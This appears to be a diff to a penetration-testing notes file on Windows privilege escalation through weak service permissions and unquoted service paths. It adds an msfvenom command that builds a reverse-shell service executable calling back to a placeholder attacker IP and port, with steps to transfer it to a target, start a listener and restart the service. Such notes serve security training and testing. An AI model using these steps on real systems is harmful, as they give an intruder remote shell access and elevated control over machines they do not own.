@@ -136,7 +136,7 @@ icacls [BINARY-PATH-NAME]
 * Look for (F)ull or (M)odify rights in various groups
 * Create payload with:
 ```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o rev-svc.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
 ```
 * Transfer the file to target machine and start a listener on attack machine
 * Restart the insecure service:
@@ -153,7 +153,10 @@ sc start [SERVICE-NAME]
 
 ## Unquoted Service Paths
 
-If there is is a program installed on the machine in a folder that is world writable (not "Program Files" or "x86 Program Files"), and it has spaces and not quoted when running "sc.exe qc [PROGRAM-FILE-PATH]" , you can create a malicious payload under a new executable with a shorter name and it will run when the longer name program runs. For example: if there is a program called "Disk Shorter.exe" (unquoted), you can create a new executable called "Disk.exe" and it will run when "Disk Shorter.exe" is called. 
+If there is is a program installed on the machine in a folder that is world writable (not "Program Files" or "x86 Program Files"), and it has spaces and not quoted when running "sc.exe qc [PROGRAM-FILE-PATH]" , you can create a malicious payload under a new executable with a shorter name and it will run when the longer name program runs. For example: if there is a program called "Disk Shorter.exe" (unquoted), you can create a new executable called "Disk.exe" and it will run when "Disk Shorter.exe" is called. use the same msfvenom command as above to generate a malicious payload:
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACKER-IP] LPORT=[ATTACK-PORT] -f exe-service -o [FILE-NAME].exe
+```
 
 ********************************************
 
